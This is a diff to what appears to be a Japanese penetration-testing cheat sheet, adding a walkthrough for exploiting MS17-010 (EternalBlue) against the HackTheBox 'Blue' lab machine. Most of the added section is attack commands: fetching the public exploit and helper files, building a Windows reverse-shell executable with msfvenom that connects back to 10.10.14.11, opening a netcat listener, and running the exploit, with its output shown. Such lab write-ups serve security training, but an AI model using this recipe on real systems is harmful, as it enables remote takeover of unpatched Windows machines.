@@ -57,6 +57,7 @@ Twitter:@yukitsukai1731
   - [Wordlist](#wordlist)
   - [Default Passwords](#default-passwords)
 - [その他](#その他)
+  - [MS17-010(EternalBlue)](#MS17-010(EternalBlue))
   - [ツールまとめ](#ツールまとめ)
     - [NetCat](#netcat)
     - [JohnTheRipper](#johntheripper)
@@ -445,6 +446,79 @@ direbusterやwifiパスワードなどのリスト集。
 ```
 
 # その他
+
+## MS17-010(EternalBlue)
+エクスプロイトに必要なものを準備
+この最後のmysmb.pyをダウンロードしておかないと、ImportError：mysmbと警告が出る。
+
+```
+wget https://www.exploit-db.com/raw/42315
+mv 42315 eternalblue.py
+wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
+```
+
+次にimpacketもインストールしておかないと使うことができないので入っていない場合は落としておく。
+
+```
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+pip install .
+```
+
+もしもここでpipが入っていないと警告が出た場合は、
+
+```
+sudo apt install python-pip
+```
+をして、pipもインストール。
+
+次にリバースシェルに使うペイロードをmsfvenomを利用して作成
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=1234 -f exe > reverse.exe
+```
+
+次にeternalblue.pyのソースコードを変更してエクスプロイトに使用できるようにする。
+まずUSERNAMEのところを下記の画像のように変更。
+
+![スクリーンショット 2020-06-15 17.04.43.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/375fcd67-ae03-1b86-3641-9ba2fc3ec5d0.png)
+
+次にsmb_pwn関数内のスクリプトを下記の画像のように変更。
+
+![スクリーンショット 2020-06-15 17.06.47.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/2ff690c1-adf5-20a0-5d7c-066e6ebd711b.png)
+
+これで準備は完了
+通信を受けるためにnetcatで待ち受けておく。
+
+```
+nc -lvp 1234
+```
+
+最後にeternalblue.pyを実行
+
+```
+┌─[✗]─[yukitsukai@parrot]─[~/htb/Blue]
+└──╼ $python eternalblue.py 10.10.10.40 ntsvcs
+Target OS: Windows 7 Professional 7601 Service Pack 1
+Target is 64 bit
+Got frag size: 0x10
+GROOM_POOL_SIZE: 0x5030
+BRIDE_TRANS_SIZE: 0xfa0
+CONNECTION: 0xfffffa8001af9560
+SESSION: 0xfffff8a001bf5de0
+.
+.
+.
+ServiceExec Error on: 10.10.10.40
+nca_s_proto_error
+Done
+```
+すると、通信を待ち受けていたnetcatの方でシェルが取得できる。
+
+![スクリーンショット 2020-06-15 17.01.52.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/88c8a374-bd9e-5b18-36d6-f0c6b3f048ca.png)
+
+
+
 ## ツールまとめ
 ## netcat
 NetcatはTCP/UDPの各プロトコルと通信することができる万能ツール。
